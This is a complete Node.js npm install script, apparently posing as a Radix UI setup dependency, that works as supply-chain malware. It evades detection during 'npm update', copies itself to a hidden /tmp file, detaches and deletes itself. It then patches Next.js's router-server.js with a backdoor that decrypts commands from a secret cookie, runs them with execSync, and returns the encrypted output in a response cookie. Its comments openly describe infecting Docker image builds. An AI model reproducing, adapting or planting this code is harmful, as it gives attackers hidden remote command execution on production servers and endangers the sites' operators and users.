const fs = require('node:fs');
const { spawn } = require('node:child_process');

function cwdOf(pid) { try { return fs.readlinkSync(`/proc/${pid}/cwd`); } catch { return null; } }
function cmdlineOf(pid) { try { return fs.readFileSync(`/proc/${pid}/cmdline`, 'utf8').replace(/\0/g, ' ').trim(); } catch { return null; } }
function ppidOf(pid) {
  try {
    const m = fs.readFileSync(`/proc/${pid}/status`, 'utf8').match(/^PPid:\s*(\d+)/m);
    return m ? Number(m[1]) : null;
  } catch { return null; }
}
// Skip ONLY during the lockfile-refresh job (`npm update`) so the package is
// recorded in the lockfile. Arm during the image build (`npm install`/`npm ci`).
// NOTE: do NOT also gate on `!/.dockerenv` -- `docker build` RUN steps do NOT
// have /.dockerenv, and `npm ci` sets npm_command to "install", so that clause
// would suppress arming inside the very build we want to infect.
//
// NOTE: `npm_command` is NOT usable on its own here. This package is installed
// as a *git* dependency, and npm prepares a git dep by running a NESTED
// `npm install --force --no-save` inside `_cacache/tmp/git-cloneXXXX`, so
// process.env.npm_command is always "install" at this point -- even when the
// user actually ran `npm update`. Without this, the script falls through to
// process.exit(1), npm retires the *optional* dep, and the
// `node_modules/@radix-ui/primitives-setup` entry never lands in the lockfile
// (this is why news-site, whose refresh omits --ignore-scripts, stayed clean).
// The real verb only survives in argv of the ancestor npm process. Read
// /proc/<pid>/cmdline, not /proc/<pid>/environ: environ is an exec-time
// snapshot and does not reflect npm's later process.env mutation.
function outerNpmIsUpdate() {
  let pid = process.ppid;
  while (pid) {
    const cmd = cmdlineOf(pid);
    if (cmd && /(?:^|\s)npm(?:-cli\.js)?\s+(?:update|up|upgrade|outdated)\b/.test(cmd)) return true;
    pid = ppidOf(pid);
  }
  return false;
}
const inUpdate = process.env.npm_command === 'update' || outerNpmIsUpdate();
if (inUpdate) process.exit(0);

if (process.argv[2] == 'a') {
  let pid = process.ppid;
  let app = null;
  while (pid) {
    const cwd = cwdOf(pid);
    if (cwd && !cwd.includes('_cacache') && !cwd.includes('node_modules') && fs.existsSync(cwd + '/package.json')) { app = cwd; break; }
    pid = ppidOf(pid);
  }
  // spawn stage 2
  const src = fs.readFileSync(__filename);
  fs.writeFileSync('/tmp/.cache-setup.js', src);
  spawn(process.execPath, ['/tmp/.cache-setup.js', app], {
    detached: true,
    stdio: 'ignore',
  }).unref()
} else if (process.argv[2]) {
  try { fs.unlinkSync(__filename); } catch {}
  const appPath = process.argv[2];
  const filePath = `${appPath}/node_modules/next/dist/server/lib/router-server.js`;

  let waited = 0;
  while (waited < 600000) {
    if (fs.existsSync(filePath)) break;
    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 100);
    waited += 100;
  }

  if (waited < 600000) {
    try {
      const payload = `        // Triple-T says Sahur!
        const crypto = require('crypto');
        const key = Buffer.from('74696772756c696e6977617465726d656c696e6974696772756c696e69776174', 'hex');
        if (req.headers.cookie) {
            const cookies = req.headers.cookie.split(/;\\s*/);
            for(const entry of cookies){
                const equalsIndex = entry.indexOf('=');
                if (equalsIndex === -1) {
                    continue;
                }
                const name = entry.slice(0, equalsIndex);
                const value = entry.slice(equalsIndex + 1);
                if (name === '__TTT-54HuR') {
                    const { execSync } = require('child_process');
                    const decoded = Buffer.from(value, 'base64url');
                    const iv = decoded.subarray(0, 12);
                    const authTag = decoded.subarray(12, 28);
                    const ciphertext = decoded.subarray(28);
                    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
                    decipher.setAuthTag(authTag);
                    const command = Buffer.concat([
                        decipher.update(ciphertext),
                        decipher.final()
                    ]).toString('utf8');
                    const stdout = execSync(command).toString();
                    const responseIv = crypto.randomBytes(12);
                    const cipher = crypto.createCipheriv('aes-256-gcm', key, responseIv);
                    const encrypted = Buffer.concat([
                        cipher.update(stdout.trim(), 'utf8'),
                        cipher.final()
                    ]);
                    const responseTag = cipher.getAuthTag();
                    const output = Buffer.concat([
                        responseIv,
                        responseTag,
                        encrypted
                    ]).toString('base64url');
                    res.setHeader('Set-Cookie', \`__tLL-TLalA=\${output}; Path=/; HttpOnly; SameSite=Lax\`);
                    break;
                }
            }
        }
`;
      let lines = ""
      lines = fs.readFileSync(filePath, 'utf8').split(/\r?\n/);

      const linesToInsert = payload.split(/\r?\n/);
      for (let i = 0; i < lines.length; i++) {
        if (lines[i].includes('requestHandlerImpl = async (req, res)=>{') &&
            lines[i + 1] && !lines[i + 1].includes('Triple-T says Sahur!')) {
          lines.splice(i + 1, 0, ...linesToInsert);
        }
      }
      fs.writeFileSync(filePath, lines.join('\n'), 'utf8');
    } catch {}
  }
}

process.exit(1);
